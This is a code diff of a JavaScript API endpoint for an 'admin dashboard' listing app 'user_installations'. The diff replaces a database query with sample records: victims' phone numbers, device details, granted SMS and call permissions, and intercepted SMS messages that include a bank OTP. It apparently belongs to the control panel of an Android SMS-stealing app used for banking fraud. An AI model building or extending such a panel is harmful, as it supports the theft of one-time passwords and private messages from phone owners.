@@ -1,10 +1,5 @@
-// Get all users for admin dashboard
-import { MongoClient } from 'mongodb';
-
-const MONGODB_URI = process.env.MONGODB_URI;
-const client = new MongoClient(MONGODB_URI);
-
 export default async function handler(req, res) {
+  // Set CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -18,22 +13,46 @@ export default async function handler(req, res) {
   }
   
   try {
-    await client.connect();
-    const db = client.db('admin_panel');
-    const collection = db.collection('user_installations');
+    // Return sample data for testing
+    // In real implementation, fetch from database
+    const sampleUsers = [
+      {
+        id: 1,
+        device_phone: "+91-9876543210",
+        device_model: "Samsung Galaxy S21",
+        android_version: "11",
+        install_time: "1758712575970",
+        permissions_granted: "SMS,PHONE,CALL",
+        created_at: new Date(Date.now() - 86400000).toISOString(), // Yesterday
+        sms_messages: [
+          "From BANK: Your OTP is 123456",
+          "From RTO: Vehicle registration due",
+          "From FRIEND: Hey, how are you?"
+        ]
+      },
+      {
+        id: 2,
+        device_phone: "+91-8765432109",
+        device_model: "OnePlus 9",
+        android_version: "12",
+        install_time: "1758712575980",
+        permissions_granted: "SMS,PHONE,CALL",
+        created_at: new Date().toISOString(), // Today
+        sms_messages: [
+          "From BANK: Payment successful Rs.500",
+          "From RTO: Challan payment received",
+          "From WORK: Meeting at 3 PM today"
+        ]
+      }
+    ];
     
-    const users = await collection
-      .find({})
-      .sort({ created_at: -1 })
-      .limit(100)
-      .toArray();
-    
-    await client.close();
-    
-    res.status(200).json(users);
+    res.status(200).json(sampleUsers);
     
   } catch (error) {
-    console.error('Database error:', error);
-    res.status(500).json({ error: 'Failed to fetch users' });
+    console.error('❌ Error fetching users:', error);
+    res.status(500).json({ 
+      error: 'Failed to fetch users',
+      message: error.message 
+    });
   }
 }
